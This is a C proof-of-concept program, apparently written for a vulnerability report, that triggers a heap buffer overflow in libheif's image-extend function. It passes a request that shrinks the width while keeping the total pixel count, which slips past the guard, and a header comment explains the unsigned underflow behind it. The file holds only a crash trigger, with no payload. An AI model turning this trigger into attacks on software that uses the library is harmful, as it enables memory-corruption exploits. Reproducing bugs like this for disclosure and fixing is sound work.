/*
 * PoC for a heap buffer overflow in HeifPixelImage::extend_to_size_with_zero(),
 * reached through the public heif_image_extend_to_size_fill_with_zero() API.
 *
 * The function is supposed to reject any request that would shrink the image
 * (it only ever grows planes). The guard compares total pixel counts instead
 * of comparing width and height independently, so a request that shrinks one
 * dimension while growing the other enough to keep (or increase) the total
 * pixel count slips past both the top-level check and the per-plane preflight
 * check. The subsequent per-row fill then computes its memset length as
 * (new_width - old_width) in unsigned 32-bit arithmetic, which underflows to
 * a huge value and writes far past the end of the pixel plane.
 */

#include <libheif/heif.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
  heif_init(NULL);

  const int orig_width = 64;
  const int orig_height = 8;

  heif_image* image = NULL;
  heif_error err = heif_image_create(orig_width, orig_height,
                                     heif_colorspace_monochrome,
                                     heif_chroma_monochrome,
                                     &image);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_create failed: %s\n", err.message);
    return 1;
  }

  err = heif_image_add_plane(image, heif_channel_Y, orig_width, orig_height, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_add_plane failed: %s\n", err.message);
    heif_image_release(image);
    return 1;
  }

  /* Initialize the plane so there is well-defined data to read/copy. */
  int stride = 0;
  uint8_t* p = heif_image_get_plane(image, heif_channel_Y, &stride);
  for (int y = 0; y < orig_height; y++) {
    memset(p + y * stride, 0x42, (size_t) orig_width);
  }

  /*
   * Target: width shrinks from 64 to 1, height grows from 8 to 600.
   * Total pixel count: 1*600 = 600 >= 64*8 = 512, so the (buggy) "total
   * pixel count must not decrease" guard accepts this as a valid "grow"
   * request, even though the width dimension actually shrinks drastically.
   */
  const uint32_t new_width = 1;
  const uint32_t new_height = 600;

  err = heif_image_extend_to_size_fill_with_zero(image, new_width, new_height);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_extend_to_size_fill_with_zero rejected the request: %s\n",
            err.message);
    heif_image_release(image);
    heif_deinit();
    return 1;
  }

  printf("extend_to_size_fill_with_zero succeeded unexpectedly (no sanitizer abort)\n");

  heif_image_release(image);
  heif_deinit();
  return 0;
}
